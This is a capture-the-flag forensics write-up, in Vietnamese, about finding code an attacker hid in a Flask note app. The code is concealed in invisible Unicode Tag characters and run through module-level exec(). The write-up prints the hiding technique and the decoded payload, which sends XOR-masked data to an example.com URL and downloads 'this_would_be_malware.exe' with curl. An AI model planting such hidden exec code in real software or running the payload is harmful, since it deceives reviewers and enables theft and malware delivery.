# Clear as Glass - Forensics/Rev Eng (500 điểm)

**Cờ:** `cdctf{G1455w0rM_w4s_pr3tTy_c0oL}`
**Tài liệu:** repo `https://github.com/shkorodi/notekeeper` (8 commit, `main` tại `a531ea3`), artifact `files/app.py` (5.311 B, SHA256 `a089e78dab3ce7ca45f6303d380ba077e0fcbbd6e266474fa4bad334c63e4eaf`)
**Tác giả đề:** b0b

## Đề bài

Chủ repo khai báo bị hack giữa lúc phát triển một app ghi chú Flask, nghi attacker sửa code trước khi push nhưng xem diff không thấy gì. Đề cho một repo GitHub công khai, không có binary, không có dịch vụ mạng. Nhiệm vụ là chỉ ra thay đổi attacker cài vào và trích chuỗi cờ mà thay đổi đó che giấu.

## Phân tích ban đầu

Lịch sử repo gọn: 8 commit trên một nhánh `main`, 0 tag, `git fsck --full --dangling` không in object lạc, `git for-each-ref` chỉ có ba ref cùng trỏ `a531ea371475532d0a6aef72a051d3bd44d1c689`. Không có force-push, nên đoạn mã attacker thêm nằm trong diff của một commit đang tồn tại và phải qua được mắt người đọc.

Chuỗi commit:

```text
a531ea3 Document features and test instructions
21d8072 Add pytest suite
70c928f Add JSON API and error pages
bd75399 Tagging and search
ca3d3e2 Add helpers module for tag parsing and text truncation
5e67f7a Add edit and delete routes
07a4c71 Add Flask skeleton with sqlite-backed notes
28d32d5 Initial commit
```

Điểm bất thường trong `app.py` tại HEAD là các dòng liên quan tới tag:

```python
notes_list = "<425 ky tu, hien ra nhu chuoi rong>"
tags_list = ""
...
for note in notes_list:
    tags_list += chr(ord(note)-0xE0000)
...
def _tags_for(db, note_ids):
    ...
exec(tags_list)
```

`notes_list` không được dùng ở chỗ nào khác ngoài vòng lặp dựng `tags_list`, và `exec(tags_list)` nằm ở cấp module nên chạy ngay khi import, tức mỗi lần khởi động app. Offset `0xE0000` trùng đầu vùng Unicode Tag: U+E0020-U+E007E ánh xạ đúng sang ASCII 0x20-0x7E, U+E000A là xuống dòng. Cả vùng này zero-width, editor lẫn diff GitHub đều không render, nên dòng 6 trông như một chuỗi rỗng. Đếm được 395 ký tự U+E00xx trong `app.py`, tất cả nằm trên dòng 6 (425 ký tự, 1611 byte); 13 file còn lại của repo có 0.

## Các hướng đã loại

`analysis/scan_hidden_unicode.py` quét working tree, mọi blob trong lịch sử, mọi commit message kèm author và committer:

1. **Lịch sử bị viết lại** (force-push, commit lạc, stash): `git fsck --full --dangling` trả rỗng, `git count-objects -v` báo 45 object nằm trọn trong một pack, `git reflog` sau clone chỉ có một dòng `clone: from https://github.com/shkorodi/notekeeper.git`. Loại.
2. **Payload cất trong object không ref nào trỏ tới**: `git cat-file --batch-all-objects --batch-check` liệt kê đủ 45 object, trong đó chỉ hai blob `app.py` có ký tự ẩn. Loại.
3. **Stego trong commit message, tên hoặc email author/committer**: scan trả 0 ký tự Tag và 0 ký tự zero-width/bidi trên cả 8 commit. Loại.
4. **Zero-width kinh điển** (U+200B-U+200F, U+202A-U+202E, U+2060, U+FEFF): 0 trên mọi file. Kênh thật là U+E00xx.
5. **Mã độc ở file khác** (templates, static, tests, `db.py`, `helpers.py`): `git grep -nE "exec\(|eval\(|subprocess|os\.system|base64"` chạy trên toàn bộ revision chỉ trả về `exec(tags_list)` trong bốn phiên bản `app.py`, tức từ `bd75399` về sau. Loại.
6. **Chạy payload để bắt request**: `example.com` là domain RFC 2606 reserved, phần đường dẫn lại là cờ XOR với `random.randbytes(32)` nên mỗi lần chạy sinh URL khác. Lời giải là phân tích tĩnh, không gọi mạng.

## Chuỗi khai thác

**Bước 1 - Định vị commit bị nhiễm.** Đếm ký tự Tag trong `app.py` ở từng commit:

```python
import subprocess, re
for c in subprocess.run(["git", "rev-list", "--reverse", "--all"],
                        capture_output=True, text=True).stdout.split():
    meta = subprocess.run(["git", "log", "-1", "--format=%h %ad %s", "--date=short", c],
                          capture_output=True, text=True).stdout.strip()
    r = subprocess.run(["git", "show", f"{c}:app.py"], capture_output=True)
    n = len(re.findall(r"[\U000E0000-\U000E0FFF]",
                       r.stdout.decode("utf-8", "replace"))) if r.returncode == 0 else "-"
    print(f"{n:>5}  {meta}")
```

```text
      -  28d32d5 2026-03-02 Initial commit
      0  07a4c71 2026-03-02 Add Flask skeleton with sqlite-backed notes
      0  5e67f7a 2026-03-05 Add edit and delete routes
      0  ca3d3e2 2026-03-11 Add helpers module for tag parsing and text truncation
    395  bd75399 2026-03-17 Tagging and search
    395  70c928f 2026-03-19 Add JSON API and error pages
    395  21d8072 2026-03-24 Add pytest suite
    395  a531ea3 2026-03-26 Document features and test instructions
```

`bd75399` là commit đầu tiên có payload, cũng là commit duy nhất thêm `notes_list`, vòng lặp `chr(ord(note)-0xE0000)` và `exec(tags_list)`. Hai blob mang payload: `e8343c21ab71a55cbee4424fc938d0091a0d0951` (`app.py` tại `bd75399`) và `c68a8cd93bf573e079f24a0fa028a0b00ced0988` (`app.py` từ `70c928f` tới HEAD).

**Bước 2 - Tái lập payload.** Ghép ASCII từ ký tự ẩn bằng đúng phép toán vòng lặp trong source:

```python
import re, pathlib
src = pathlib.Path("files/app.py").read_text(encoding="utf-8")
tags = [c for c in src if 0xE0000 <= ord(c) <= 0xE0FFF]
payload = "".join(chr(ord(c) - 0xE0000) for c in tags)
print(len(tags))
print(payload)
```

`print(len(tags))` trả `395`. Chuỗi tái lập được:

```python
f=bytes.fromhex("04266506711a20733247221657304b2d6055141d76002415333b5911270e2b3f")
k=bytes.fromhex("6742067217616742067217616742067217616742067217616742067217616742")
fl=bytes(a ^ b for a, b in zip(k, f))
import random, subprocess
e=random.randbytes(32)
u=f"https://example.com/{bytes.hex(bytes(a ^ b for a, b in zip(e, fl)))}"
subprocess.run(["curl", "-o", "./this_would_be_malware.exe", u])
```

Ba lớp việc trong đoạn này: `fl = f XOR k` là dữ liệu attacker cần lấy ra; `e = random.randbytes(32)` rồi `hex(e XOR fl)` đặt vào đường dẫn URL, che nội dung exfil khỏi log và làm request không tái lập được; `subprocess.run(["curl", "-o", ...])` tải binary về dưới tên `this_would_be_malware.exe`, nhưng payload chỉ dừng ở bước tải. Vì `exec(tags_list)` chạy ở cấp module, toàn bộ chuỗi trên thực thi mỗi lần app khởi động mà không route nào phải được gọi.

**Bước 3 - Kiểm chứng.** Cờ là `fl`, tức `f XOR k`:

```python
import re, pathlib
src = pathlib.Path("files/app.py").read_text(encoding="utf-8")
tags = [c for c in src if 0xE0000 <= ord(c) <= 0xE0FFF]
payload = "".join(chr(ord(c) - 0xE0000) for c in tags)
f = bytes.fromhex(re.search(r'f=bytes\.fromhex\("([0-9a-f]+)"\)', payload).group(1))
k = bytes.fromhex(re.search(r'k=bytes\.fromhex\("([0-9a-f]+)"\)', payload).group(1))
print(len(f), len(k))
print("flag:", bytes(a ^ b for a, b in zip(k, f)).decode())
```

```text
395
32 32
flag: cdctf{G1455w0rM_w4s_pr3tTy_c0oL}
```

Hai blob dài 32 byte, XOR ra chuỗi in được trọn vẹn, khớp `cdctf{...}` và có cấu trúc leetspeak như định dạng đề nêu. `k` tuần hoàn đúng 6 byte `67 42 06 72 17 61`, còn `f` thì không, nên `f` là dữ liệu và `k` là key.

## Flag

```bash
python exploit.py files/app.py
```

```text
[*] 4126 ky tu trong file, 395 ky tu an U+E0000-U+E0FFF
[*] payload tai lap duoc tu `exec(tags_list)`:

f=bytes.fromhex("04266506711a20733247221657304b2d6055141d76002415333b5911270e2b3f")
k=bytes.fromhex("6742067217616742067217616742067217616742067217616742067217616742")
fl=bytes(a ^ b for a, b in zip(k, f))
import random, subprocess
e=random.randbytes(32)
u=f"https://example.com/{bytes.hex(bytes(a ^ b for a, b in zip(e, fl)))}"
subprocess.run(["curl", "-o", "./this_would_be_malware.exe", u])

[*] len(f)=32 len(k)=32
[*] XOR(f, k): b'cdctf{G1455w0rM_w4s_pr3tTy_c0oL}'
[+] co: cdctf{G1455w0rM_w4s_pr3tTy_c0oL}
[+] da luu flag.txt
```

## Reproduce

```bash
git clone https://github.com/shkorodi/notekeeper.git
git -C notekeeper cat-file blob HEAD:app.py > files/app.py
python exploit.py files/app.py
python analysis/scan_hidden_unicode.py notekeeper
```

`files/app.py` là blob git gốc (LF). Checkout trên Windows có `core.autocrlf=true` cho ra bản CRLF 5.429 byte, ký tự ẩn giữ nguyên nên cả hai bản đều giải mã được.
